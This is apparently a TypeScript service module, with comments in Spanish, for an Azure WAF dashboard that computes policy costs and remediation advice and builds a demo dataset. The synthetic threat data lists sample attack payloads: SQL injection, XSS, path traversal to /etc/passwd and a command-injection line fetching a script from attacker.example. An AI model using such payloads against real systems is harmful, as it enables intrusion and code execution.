/**
 * Azure WAF — Seguridad Perimetral y Economia Unitaria
 *
 * RBAC minimo en Azure: `Reader` sobre las suscripciones (inventario de
 * politicas via Resource Graph) y `Log Analytics Reader` sobre el workspace que
 * recibe los logs de diagnostico del WAF. Solo lectura: la remediacion se
 * entrega como comando.
 *
 * Las dos plataformas tienen economias distintas, y eso cambia las
 * recomendaciones:
 *  - Application Gateway WAF_v2: instancia fija por hora MAS Capacity Units.
 *    Procesar menos trafico SI reduce la factura.
 *  - Front Door Premium: base mensual plana MAS cargo por millon de solicitudes,
 *    que se paga igual se bloquee o se permita. Filtrar antes ahorra mucho menos.
 */

import { getAzureCredential, getResourceGraphClient } from "@/lib/azure";
import { getSubscriptionNameMap } from "@/lib/azureSubscriptionNames";
import { withArgLimit } from "@/lib/argConcurrency";
import { errorMessage } from "@/lib/apiErrors";
import {
  AFD_CUSTOM_RULE_USD_MONTH,
  AFD_MANAGED_RULESET_USD_MONTH,
  AFD_PREMIUM_BASE_USD_MONTH,
  AFD_WAF_USD_PER_MILLION_REQUESTS,
  APPGW_WAF_CU_USD_HOUR,
  APPGW_WAF_FIXED_USD_HOUR,
  GEO_FILTER_CU_SAVING_RATIO,
  HOURS_PER_MONTH,
  type WafHostPlatform,
  type WafMode,
  type WafOriginMetric,
  type WafPayload,
  type WafPolicyResourceItem,
  type WafRemediationAction,
  type WafSummaryMetrics,
  type WafThreatCategory,
} from "@/types/azureWaf.types";

// ─────────────────────────────────────────────────────────────────────────────
// Normalizacion
// ─────────────────────────────────────────────────────────────────────────────

export function normalizeHostPlatform(resourceType: string): WafHostPlatform {
  return resourceType.toLowerCase().includes("frontdoor") ? "FrontDoor" : "ApplicationGateway";
}

/** Modo de la politica. Cualquier valor distinto de Prevention es Detection. */
export function normalizeMode(raw: unknown): WafMode {
  return String(raw || "").toLowerCase() === "prevention" ? "Prevention" : "Detection";
}

/**
 * `true` si la IP es publica. Los rangos RFC1918, loopback, link-local y CGNAT
 * no aportan inteligencia de amenazas: son trafico interno o del propio
 * balanceador, y ensucian el top de origenes bloqueados.
 */
export function isPublicIp(ip: string): boolean {
  const clean = ip.trim().split(":")[0]; // descarta el puerto si viene
  const m = clean.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (!m) return false;
  const [a, b] = [Number(m[1]), Number(m[2])];
  if ([a, Number(m[2]), Number(m[3]), Number(m[4])].some((n) => n > 255)) return false;
  if (a === 10) return false;
  if (a === 127) return false;
  if (a === 0) return false;
  if (a === 172 && b >= 16 && b <= 31) return false;
  if (a === 192 && b === 168) return false;
  if (a === 169 && b === 254) return false;
  if (a === 100 && b >= 64 && b <= 127) return false; // CGNAT
  if (a >= 224) return false; // multicast y reservados
  return true;
}

/** Detecta si una regla personalizada filtra por geografia. */
export function isGeoFilterRule(rule: Record<string, unknown>): boolean {
  const conditions = Array.isArray(rule.matchConditions) ? rule.matchConditions : [];
  return conditions.some((c) => {
    const cond = c as Record<string, unknown>;
    const variables = Array.isArray(cond.matchVariables) ? cond.matchVariables : [];
    const byVariable = variables.some(
      (v) => String((v as Record<string, unknown>).variableName || "").toLowerCase() === "remoteaddr"
    );
    return String(cond.operator || "").toLowerCase() === "geomatch" && (byVariable || variables.length === 0);
  });
}

/** Detecta si una regla personalizada aplica rate limiting. */
export function isRateLimitRule(rule: Record<string, unknown>): boolean {
  return String(rule.ruleType || "").toLowerCase() === "ratelimitrule";
}

/**
 * Heuristica de produccion. Se mira el nombre de la politica, el RG, la
 * suscripcion y los endpoints asociados: un endpoint publico con dominio propio
 * es señal mas fuerte que el nombre del grupo de recursos.
 */
export function looksProduction(input: {
  name: string;
  resourceGroup: string;
  subscriptionName: string;
  associatedEndpoints: string[];
}): boolean {
  // Los nombres de politica en Azure son camelCase casi siempre
  // (`wafPolicyWebProd`), y `\bprod\b` no encuentra un limite de palabra ahi.
  // Se separan las mayusculas antes de buscar para no perder la señal.
  const haystack = `${input.name} ${input.resourceGroup} ${input.subscriptionName}`
    .replace(/([a-z0-9])([A-Z])/g, "$1 $2")
    .toLowerCase();
  if (/\b(dev|desarrollo|test|testing|qa|stg|stage|staging|sandbox|poc|lab|preprod|pre-prod|nonprod|non-prod)\b/.test(haystack)) {
    return false;
  }
  if (/\b(prod|produccion|production|prd)\b/.test(haystack)) return true;
  // Sin señal en los nombres, un endpoint con dominio propio (no azure-managed)
  // se trata como productivo: equivocarse hacia "no productivo" haria callar la
  // alerta de una politica en Detection que si protege produccion.
  return input.associatedEndpoints.some((e) => !/azurefd\.net|cloudapp\.azure\.com|azurewebsites\.net/i.test(e));
}

// ─────────────────────────────────────────────────────────────────────────────
// Costo
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Costo mensual de la politica segun plataforma.
 *
 * Application Gateway: instancia fija + Capacity Units.
 * Front Door Premium: base + managed ruleset + reglas personalizadas + cargo por
 * millon de solicitudes evaluadas.
 */
export function calcPolicyMonthlyCost(input: {
  hostPlatform: WafHostPlatform;
  state: "Enabled" | "Disabled";
  isOrphan: boolean;
  avgCapacityUnits: number;
  totalRequestsMTD: number;
  customRulesCount: number;
}): number {
  // Una politica sin recurso asociado no tiene plano de datos: no factura
  // computo, solo ocupa inventario. Cobrarle la base seria inventar gasto.
  if (input.isOrphan || input.state === "Disabled") return 0;

  if (input.hostPlatform === "ApplicationGateway") {
    const fixed = APPGW_WAF_FIXED_USD_HOUR * HOURS_PER_MONTH;
    const cu = input.avgCapacityUnits * APPGW_WAF_CU_USD_HOUR * HOURS_PER_MONTH;
    return Number((fixed + cu).toFixed(2));
  }

  const requests = (input.totalRequestsMTD / 1_000_000) * AFD_WAF_USD_PER_MILLION_REQUESTS;
  return Number(
    (
      AFD_PREMIUM_BASE_USD_MONTH +
      AFD_MANAGED_RULESET_USD_MONTH +
      input.customRulesCount * AFD_CUSTOM_RULE_USD_MONTH +
      requests
    ).toFixed(2)
  );
}

/**
 * Ahorro estimado de un geo-filtro temprano.
 *
 * Solo aplica a Application Gateway: alli las Capacity Units escalan con el
 * trabajo de inspeccion, y una regla de alta prioridad descarta el paquete antes
 * de ejecutar la matriz CRS. En Front Door el cargo por solicitud se paga igual
 * se bloquee o se permita, asi que el ahorro es cero y no se debe prometer.
 */
export function calcGeoFilterSaving(policy: WafPolicyResourceItem): number {
  if (policy.hostPlatform !== "ApplicationGateway") return 0;
  if (policy.isOrphan || policy.state === "Disabled") return 0;
  const cuCost = policy.avgCapacityUnits * APPGW_WAF_CU_USD_HOUR * HOURS_PER_MONTH;
  return Number((cuCost * GEO_FILTER_CU_SAVING_RATIO).toFixed(2));
}

// ─────────────────────────────────────────────────────────────────────────────
// Agregacion
// ─────────────────────────────────────────────────────────────────────────────

/** Normaliza una lista de origenes a porcentajes sobre el total bloqueado. */
export function toOriginMetrics(
  rows: Array<{ identifier: string; countryCode?: string; countryName?: string; blockedCount: number }>,
  limit = 5
): WafOriginMetric[] {
  const total = rows.reduce((a, r) => a + r.blockedCount, 0);
  return rows
    .slice()
    .sort((a, b) => b.blockedCount - a.blockedCount)
    .slice(0, limit)
    .map((r) => ({
      identifier: r.identifier,
      countryCode: r.countryCode,
      countryName: r.countryName,
      blockedCount: r.blockedCount,
      percentage: total > 0 ? Number(((r.blockedCount / total) * 100).toFixed(1)) : 0,
    }));
}

export function calculateWafSummary(
  policies: WafPolicyResourceItem[],
  threats: WafThreatCategory[],
  topIps: WafOriginMetric[],
  topCountries: WafOriginMetric[],
  remediations: WafRemediationAction[]
): WafSummaryMetrics {
  const totalCost = policies.reduce((a, p) => a + p.monthlyCostUSD, 0);
  const totalRequests = policies.reduce((a, p) => a + p.totalRequestsMTD, 0);
  const totalBlocked = policies.reduce((a, p) => a + p.blockedRequestsCount, 0);
  const totalDetected = policies.reduce((a, p) => a + p.detectedRequestsCount, 0);
  const totalGB = policies.reduce((a, p) => a + p.throughputGB, 0);
  const protectedApps = policies.filter((p) => !p.isOrphan && p.state === "Enabled").length;

  // Aproximacion de falsos positivos: la proporcion de bloqueos atribuidos a
  // reglas de baja severidad. No es una medicion — un falso positivo real solo
  // se confirma revisando la peticion. La UI lo declara como estimacion.
  const lowSeverityAttempts = threats
    .filter((t) => t.severity === "Low")
    .reduce((a, t) => a + t.attemptsCount, 0);
  const falsePositiveRate = totalBlocked > 0 ? (lowSeverityAttempts / totalBlocked) * 100 : 0;

  return {
    totalMonthlyCostUSD: Number(totalCost.toFixed(2)),
    totalProtectedApps: protectedApps,
    totalRequestsMTD: totalRequests,
    totalBlockedRequests: totalBlocked,
    totalDetectedRequests: totalDetected,
    blockRatePercentage: totalRequests > 0 ? Number(((totalBlocked / totalRequests) * 100).toFixed(2)) : 0,
    falsePositiveRatePercentage: Number(falsePositiveRate.toFixed(2)),
    costPerAppUSD: protectedApps > 0 ? Number((totalCost / protectedApps).toFixed(2)) : 0,
    costPerMillionRequestsUSD:
      totalRequests > 0 ? Number((totalCost / (totalRequests / 1_000_000)).toFixed(2)) : 0,
    costPerGbUSD: totalGB > 0 ? Number((totalCost / totalGB).toFixed(2)) : 0,
    totalThroughputGB: Number(totalGB.toFixed(1)),
    policiesInDetectionCount: policies.filter((p) => p.mode === "Detection" && !p.isOrphan).length,
    orphanPoliciesCount: policies.filter((p) => p.isOrphan).length,
    threatsBreakdown: threats.slice().sort((a, b) => b.attemptsCount - a.attemptsCount),
    topIps,
    topCountries,
    potentialSavingsUSD: Number(remediations.reduce((a, r) => a + r.estimatedSavingsUSD, 0).toFixed(2)),
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Motor de recomendaciones
// ─────────────────────────────────────────────────────────────────────────────

export function generateWafRecommendations(
  policies: WafPolicyResourceItem[],
  topCountries: WafOriginMetric[]
): WafRemediationAction[] {
  const out: WafRemediationAction[] = [];

  for (const p of policies) {
    // Regla 3 — politicas huerfanas. Primero porque es la unica sin riesgo.
    if (p.isOrphan) {
      out.push({
        id: `orphan-${p.id}`,
        policyId: p.id,
        policyName: p.name,
        title: `Eliminar politica WAF huerfana: ${p.name}`,
        description: `No tiene ningun ${
          p.hostPlatform === "FrontDoor" ? "endpoint de Front Door" : "Application Gateway"
        } asociado, asi que no inspecciona nada. No factura computo, pero ensucia el inventario y sus reglas personalizadas se pierden de vista: alguien puede asociarla mas tarde creyendo que esta probada.`,
        category: "PURGE_ORPHAN_POLICY",
        // Sin plano de datos no hay gasto que recortar: el valor es de higiene.
        estimatedSavingsUSD: 0,
        confidence: "HIGH",
        actionType: "DELETE_WAF_POLICY",
      });
      continue;
    }

    // Regla 1 — Detection en produccion. Es un hallazgo de RIESGO: se esta
    // pagando el servicio sin mitigar nada.
    if (p.needsPreventionMode) {
      out.push({
        id: `prevention-${p.id}`,
        policyId: p.id,
        policyName: p.name,
        title: `RIESGO: ${p.name} esta en modo Detection sobre produccion`,
        description: `La politica protege ${p.associatedEndpoints.join(", ") || "endpoints productivos"} pero solo REGISTRA los ataques, no los bloquea: ${p.detectedRequestsCount.toLocaleString(
          "es-AR"
        )} solicitudes maliciosas llegaron a la aplicacion este mes. Se paga el WAF sin obtener mitigacion. Antes de cambiar a Prevention, revisar los eventos detectados para identificar falsos positivos y crear exclusiones: pasar en frio puede bloquear trafico legitimo.`,
        category: "ENABLE_PREVENTION",
        estimatedSavingsUSD: 0,
        confidence: "HIGH",
        actionType: "SET_PREVENTION_MODE",
      });
    }

    // Regla 2 — geo-filtro temprano. Solo tiene ahorro en Application Gateway.
    // El disparador cuenta bloqueos MAS detecciones: en modo Detection la matriz
    // CRS se ejecuta igual y consume las mismas Capacity Units, solo que no
    // rechaza. Mirar unicamente los bloqueos dejaria fuera justo a las politicas
    // en Detection, que son las que mas trabajo de inspeccion desperdician.
    const geoSaving = calcGeoFilterSaving(p);
    const inspectedThreats = p.blockedRequestsCount + p.detectedRequestsCount;
    if (!p.hasGeoFilterRule && topCountries.length > 0 && inspectedThreats > 0) {
      const top = topCountries.slice(0, 3).map((c) => c.countryName || c.identifier).join(", ");
      out.push({
        id: `geo-${p.id}`,
        policyId: p.id,
        policyName: p.name,
        title: `Regla de geo-filtro temprano en ${p.name}`,
        description:
          p.hostPlatform === "ApplicationGateway"
            ? `Los origenes mas bloqueados (${top}) atraviesan la matriz CRS completa antes de ser rechazados. Una regla personalizada de geo-match con prioridad alta los descarta antes, y las Capacity Units escalan con el trabajo de inspeccion: se estima hasta un ${Math.round(
                GEO_FILTER_CU_SAVING_RATIO * 100
              )}% menos de CU. Verificar primero que no haya usuarios legitimos en esos paises.`
            : `Los origenes mas bloqueados (${top}) se pueden rechazar con una regla de geo-match de alta prioridad, lo que reduce ruido y latencia. En Front Door el ahorro economico es CERO: el cargo por solicitud se paga igual se bloquee o se permita, asi que esta accion es de higiene, no de costo.`,
        category: "GEO_FILTER_RULE",
        estimatedSavingsUSD: geoSaving,
        confidence: p.hostPlatform === "ApplicationGateway" ? "MEDIUM" : "MEDIUM",
        actionType: "ADD_GEO_FILTER_RULE",
      });
    }

    // Rate limiting: mitiga scraping y credential stuffing. En App Gateway
    // tambien recorta CU; en Front Door es solo proteccion.
    if (!p.hasRateLimitRule && p.totalRequestsMTD > 1_000_000) {
      out.push({
        id: `ratelimit-${p.id}`,
        policyId: p.id,
        policyName: p.name,
        title: `Rate limiting por IP en ${p.name}`,
        description: `${(p.totalRequestsMTD / 1_000_000).toFixed(
          1
        )}M solicitudes mensuales sin ninguna regla de limite por cliente. Un umbral por IP (p. ej. 1000 req/min) corta el scraping abusivo y el credential stuffing antes de que consuman inspeccion. Empezar en modo Log para calibrar el umbral con trafico real: un limite mal elegido bloquea a los usuarios detras de un NAT corporativo.`,
        category: "RATE_LIMITING",
        estimatedSavingsUSD: 0,
        confidence: "MEDIUM",
        actionType: "ADD_RATE_LIMIT_RULE",
      });
    }
  }

  return out.sort((a, b) => b.estimatedSavingsUSD - a.estimatedSavingsUSD);
}

// ─────────────────────────────────────────────────────────────────────────────
// Dataset sintetico por tier (solo tenants demo — AGENTS.md #13)
// ─────────────────────────────────────────────────────────────────────────────

function buildPolicy(
  input: Omit<WafPolicyResourceItem, "monthlyCostUSD" | "needsPreventionMode" | "isProduction"> & {
    isProduction?: boolean;
  }
): WafPolicyResourceItem {
  const isProduction =
    input.isProduction ??
    looksProduction({
      name: input.name,
      resourceGroup: input.resourceGroup,
      subscriptionName: input.subscriptionName,
      associatedEndpoints: input.associatedEndpoints,
    });
  return {
    ...input,
    isProduction,
    needsPreventionMode: input.mode === "Detection" && isProduction && !input.isOrphan,
    monthlyCostUSD: calcPolicyMonthlyCost({
      hostPlatform: input.hostPlatform,
      state: input.state,
      isOrphan: input.isOrphan,
      avgCapacityUnits: input.avgCapacityUnits,
      totalRequestsMTD: input.totalRequestsMTD,
      customRulesCount: input.customRulesCount,
    }),
  };
}

export function getMockWafPayload(tenantId: string): WafPayload {
  const isEnterprise = tenantId.includes("4444");
  const isBusiness = tenantId.includes("2222") || isEnterprise;

  const SUB_PROD = { id: "00000000-0000-0000-0000-000000000001", name: "Produccion CSCloudSolutions" };

  const policies: WafPolicyResourceItem[] = [
    buildPolicy({
      id: `/subscriptions/${SUB_PROD.id}/resourceGroups/rg-prod-edge/providers/Microsoft.Network/FrontDoorWebApplicationFirewallPolicies/wafPolicyApiProd`,
      name: "wafPolicyApiProd",
      hostPlatform: "FrontDoor",
      location: "global",
      resourceGroup: "rg-prod-edge",
      subscriptionId: SUB_PROD.id,
      subscriptionName: SUB_PROD.name,
      mode: "Prevention",
      state: "Enabled",
      managedRuleSet: "Microsoft_DefaultRuleSet 2.1",
      customRulesCount: 4,
      hasGeoFilterRule: true,
      hasRateLimitRule: true,
      associatedEndpoints: ["api.cscloudsolutions.com.ar"],
      totalRequestsMTD: 28_400_000,
      blockedRequestsCount: 96_120,
      detectedRequestsCount: 4_310,
      throughputGB: 412,
      avgCapacityUnits: 0,
      isOrphan: false,
    }),
    // Regla 1: Detection sobre produccion.
    buildPolicy({
      id: `/subscriptions/${SUB_PROD.id}/resourceGroups/rg-prod-web/providers/Microsoft.Network/ApplicationGatewayWebApplicationFirewallPolicies/wafPolicyWebProd`,
      name: "wafPolicyWebProd",
      hostPlatform: "ApplicationGateway",
      location: "eastus",
      resourceGroup: "rg-prod-web",
      subscriptionId: SUB_PROD.id,
      subscriptionName: SUB_PROD.name,
      mode: "Detection",
      state: "Enabled",
      managedRuleSet: "OWASP 3.2",
      customRulesCount: 1,
      hasGeoFilterRule: false,
      hasRateLimitRule: false,
      associatedEndpoints: ["webapp-prod-appgateway"],
      totalRequestsMTD: 14_800_000,
      blockedRequestsCount: 0,
      detectedRequestsCount: 61_480,
      throughputGB: 218,
      avgCapacityUnits: 18,
      isOrphan: false,
    }),
    // Regla 3: politica huerfana.
    buildPolicy({
      id: `/subscriptions/${SUB_PROD.id}/resourceGroups/rg-legacy/providers/Microsoft.Network/ApplicationGatewayWebApplicationFirewallPolicies/wafPolicyLegacyUnused`,
      name: "wafPolicyLegacyUnused",
      hostPlatform: "ApplicationGateway",
      location: "westus2",
      resourceGroup: "rg-legacy",
      subscriptionId: SUB_PROD.id,
      subscriptionName: SUB_PROD.name,
      mode: "Prevention",
      state: "Enabled",
      managedRuleSet: "OWASP 3.1",
      customRulesCount: 2,
      hasGeoFilterRule: false,
      hasRateLimitRule: false,
      associatedEndpoints: [],
      totalRequestsMTD: 0,
      blockedRequestsCount: 0,
      detectedRequestsCount: 0,
      throughputGB: 0,
      avgCapacityUnits: 0,
      isOrphan: true,
    }),
  ];

  if (isBusiness) {
    policies.push(
      buildPolicy({
        id: `/subscriptions/${SUB_PROD.id}/resourceGroups/rg-dev-web/providers/Microsoft.Network/ApplicationGatewayWebApplicationFirewallPolicies/wafPolicyDev`,
        name: "wafPolicyDev",
        hostPlatform: "ApplicationGateway",
        location: "eastus",
        resourceGroup: "rg-dev-web",
        subscriptionId: SUB_PROD.id,
        subscriptionName: SUB_PROD.name,
        // Detection en desarrollo NO es un hallazgo: ahi es donde se calibran
        // las exclusiones antes de pasar a Prevention en produccion.
        mode: "Detection",
        state: "Enabled",
        managedRuleSet: "OWASP 3.2",
        customRulesCount: 0,
        hasGeoFilterRule: false,
        hasRateLimitRule: false,
        associatedEndpoints: ["webapp-dev-appgateway"],
        totalRequestsMTD: 320_000,
        blockedRequestsCount: 0,
        detectedRequestsCount: 1_840,
        throughputGB: 6,
        avgCapacityUnits: 3,
        isOrphan: false,
      })
    );
  }

  if (isEnterprise) {
    policies.push(
      buildPolicy({
        id: `/subscriptions/${SUB_PROD.id}/resourceGroups/rg-prod-emea/providers/Microsoft.Network/FrontDoorWebApplicationFirewallPolicies/wafPolicyEmea`,
        name: "wafPolicyEmea",
        hostPlatform: "FrontDoor",
        location: "global",
        resourceGroup: "rg-prod-emea",
        subscriptionId: SUB_PROD.id,
        subscriptionName: SUB_PROD.name,
        mode: "Prevention",
        state: "Enabled",
        managedRuleSet: "Microsoft_DefaultRuleSet 2.1",
        customRulesCount: 6,
        hasGeoFilterRule: false,
        hasRateLimitRule: true,
        associatedEndpoints: ["portal.cscloudsolutions.com.ar", "cdn.cscloudsolutions.com.ar"],
        totalRequestsMTD: 9_600_000,
        blockedRequestsCount: 38_900,
        detectedRequestsCount: 2_100,
        throughputGB: 144,
        avgCapacityUnits: 0,
        isOrphan: false,
      })
    );
  }

  // Amenazas: los prefijos de regla corresponden al OWASP CRS real.
  const threats: WafThreatCategory[] = [
    {
      categoryName: "SQL Injection",
      severity: "High",
      attemptsCount: isEnterprise ? 58_240 : 45_230,
      crsRulePrefix: "942",
      payloadExamples: ["'; DROP TABLE users; --", "1' OR '1'='1", "admin'--", "UNION SELECT null,version()"],
    },
    {
      categoryName: "Cross-Site Scripting (XSS)",
      severity: "High",
      attemptsCount: isEnterprise ? 49_110 : 38_920,
      crsRulePrefix: "941",
      payloadExamples: ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "javascript:alert(document.cookie)"],
    },
    {
      categoryName: "Path Traversal",
      severity: "Medium",
      attemptsCount: isEnterprise ? 33_780 : 28_450,
      crsRulePrefix: "930",
      payloadExamples: ["../../etc/passwd", "..%2F..%2Fwindows%2Fwin.ini", "....//....//etc/shadow"],
    },
    {
      categoryName: "Remote Code Execution",
      severity: "High",
      attemptsCount: isBusiness ? 12_640 : 8_200,
      crsRulePrefix: "932",
      payloadExamples: ["; cat /etc/passwd", "$(curl attacker.example/sh)", "|| ping -c 10 127.0.0.1"],
    },
    {
      categoryName: "Scanner / Bot Detection",
      severity: "Low",
      attemptsCount: isBusiness ? 6_420 : 4_180,
      crsRulePrefix: "913",
      payloadExamples: ["User-Agent: sqlmap/1.7", "User-Agent: nikto", "User-Agent: masscan"],
    },
  ];

  const topIps = toOriginMetrics([
    { identifier: "45.155.205.233", countryCode: "RU", countryName: "Rusia", blockedCount: 18_420 },
    { identifier: "103.246.200.14", countryCode: "CN", countryName: "China", blockedCount: 14_880 },
    { identifier: "185.220.101.47", countryCode: "DE", countryName: "Alemania (Tor exit)", blockedCount: 11_260 },
    { identifier: "159.89.214.31", countryCode: "IN", countryName: "India", blockedCount: 9_140 },
    { identifier: "177.54.144.90", countryCode: "BR", countryName: "Brasil", blockedCount: 7_320 },
  ]);

  const topCountries = toOriginMetrics([
    { identifier: "CN", countryCode: "CN", countryName: "China", blockedCount: 41_200 },
    { identifier: "RU", countryCode: "RU", countryName: "Rusia", blockedCount: 33_640 },
    { identifier: "IN", countryCode: "IN", countryName: "India", blockedCount: 19_880 },
    { identifier: "BR", countryCode: "BR", countryName: "Brasil", blockedCount: 14_310 },
    { identifier: "VN", countryCode: "VN", countryName: "Vietnam", blockedCount: 10_990 },
  ]);

  const remediations = generateWafRecommendations(policies, topCountries);
  const summary = calculateWafSummary(policies, threats, topIps, topCountries, remediations);

  return {
    summary,
    policies,
    remediations,
    source: "mock",
    lastUpdated: new Date().toISOString(),
    availableSubscriptions: Array.from(new Set(policies.map((p) => p.subscriptionName))),
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// Descubrimiento vivo
// ─────────────────────────────────────────────────────────────────────────────

function emptyPayload(availableSubscriptions: string[] = [], telemetryUnavailable = false): WafPayload {
  return {
    summary: calculateWafSummary([], [], [], [], []),
    policies: [],
    remediations: [],
    source: "live",
    lastUpdated: new Date().toISOString(),
    availableSubscriptions,
    telemetryUnavailable,
  };
}

/**
 * Inventario vivo de politicas WAF de Front Door y Application Gateway.
 *
 * La telemetria de amenazas requiere el log `AzureDiagnostics` en un workspace
 * de Log Analytics. Cuando no esta disponible el payload lo declara con
 * `telemetryUnavailable` y los contadores quedan en cero: fabricar amenazas
 * seria exactamente el fallback que la Directiva 24.1 prohibe, y en un panel de
 * seguridad seria mucho peor que en uno de costos.
 */
export async function fetchLiveWafData(tenantId: string): Promise<WafPayload> {
  try {
    const credential = await getAzureCredential(tenantId);
    if (!credential) return emptyPayload();

    const subMap = await getSubscriptionNameMap(tenantId, credential).catch(() => new Map<string, string>());
    const availableSubscriptions = Array.from(subMap.values());
    const client = await getResourceGraphClient(tenantId);

    const policiesQuery = `
      resources
      | where type =~ 'microsoft.network/applicationgatewaywebapplicationfirewallpolicies'
         or type =~ 'microsoft.network/frontdoorwebapplicationfirewallpolicies'
      | project id, name, type, location, resourceGroup, subscriptionId, properties
    `;

    const response = await withArgLimit(async () => client.resources({ query: policiesQuery }));
    const rows: Array<Record<string, unknown>> = response.data || [];
    if (rows.length === 0) return emptyPayload(availableSubscriptions, true);

    const policies: WafPolicyResourceItem[] = rows.map((row) => {
      const props = (row.properties || {}) as Record<string, unknown>;
      const settings = (props.policySettings || {}) as Record<string, unknown>;
      const managedRules = (props.managedRules || {}) as Record<string, unknown>;
      const ruleSets = Array.isArray(managedRules.managedRuleSets) ? managedRules.managedRuleSets : [];
      const customRules = Array.isArray(props.customRules)
        ? (props.customRules as Array<Record<string, unknown>>)
        : Array.isArray((props.customRules as Record<string, unknown> | undefined)?.rules)
          ? ((props.customRules as Record<string, unknown>).rules as Array<Record<string, unknown>>)
          : [];

      // Endpoints asociados: Application Gateway usa `applicationGateways`,
      // Front Door usa `frontendEndpointLinks` o `securityPolicyLinks`.
      const associations = [
        ...(Array.isArray(props.applicationGateways) ? props.applicationGateways : []),
        ...(Array.isArray(props.httpListeners) ? props.httpListeners : []),
        ...(Array.isArray(props.frontendEndpointLinks) ? props.frontendEndpointLinks : []),
        ...(Array.isArray(props.securityPolicyLinks) ? props.securityPolicyLinks : []),
      ];
      const associatedEndpoints = associations
        .map((a) => {
          const id = String((a as Record<string, unknown>).id || "");
          return id.split("/").pop() || "";
        })
        .filter(Boolean);

      const resourceType = String(row.type || "");
      const hostPlatform = normalizeHostPlatform(resourceType);
      const subscriptionId = String(row.subscriptionId || "");
      const subscriptionName = subMap.get(subscriptionId) || subscriptionId;
      const name = String(row.name || "");
      const resourceGroup = String(row.resourceGroup || "");
      const isOrphan = associatedEndpoints.length === 0;
      const mode = normalizeMode(settings.mode);
      const state: "Enabled" | "Disabled" =
        String(settings.state || "").toLowerCase() === "disabled" ? "Disabled" : "Enabled";

      const isProduction = looksProduction({ name, resourceGroup, subscriptionName, associatedEndpoints });

      return {
        id: String(row.id || ""),
        name,
        hostPlatform,
        location: String(row.location || ""),
        resourceGroup,
        subscriptionId,
        subscriptionName,
        mode,
        state,
        managedRuleSet:
          ruleSets
            .map((r) => {
              const rs = r as Record<string, unknown>;
              return `${rs.ruleSetType || ""} ${rs.ruleSetVersion || ""}`.trim();
            })
            .filter(Boolean)
            .join(", ") || "Sin ruleset administrado",
        customRulesCount: customRules.length,
        hasGeoFilterRule: customRules.some(isGeoFilterRule),
        hasRateLimitRule: customRules.some(isRateLimitRule),
        associatedEndpoints,
        // Sin Log Analytics no hay telemetria de trafico: se deja en cero real.
        totalRequestsMTD: 0,
        blockedRequestsCount: 0,
        detectedRequestsCount: 0,
        throughputGB: 0,
        avgCapacityUnits: 0,
        monthlyCostUSD: calcPolicyMonthlyCost({
          hostPlatform,
          state,
          isOrphan,
          avgCapacityUnits: 0,
          totalRequestsMTD: 0,
          customRulesCount: customRules.length,
        }),
        isOrphan,
        needsPreventionMode: mode === "Detection" && isProduction && !isOrphan,
        isProduction,
      };
    });

    // La telemetria de amenazas vive en AzureDiagnostics dentro del workspace de
    // Log Analytics vinculado a cada politica. Sin esa consulta el modulo no
    // inventa amenazas ni origenes: declara la ausencia.
    const remediations = generateWafRecommendations(policies, []);
    const summary = calculateWafSummary(policies, [], [], [], remediations);

    return {
      summary,
      policies,
      remediations,
      source: "live",
      lastUpdated: new Date().toISOString(),
      availableSubscriptions,
      telemetryUnavailable: true,
    };
  } catch (error) {
    console.error("[azureWaf.service] fetchLiveWafData:", errorMessage(error));
    return emptyPayload();
  }
}
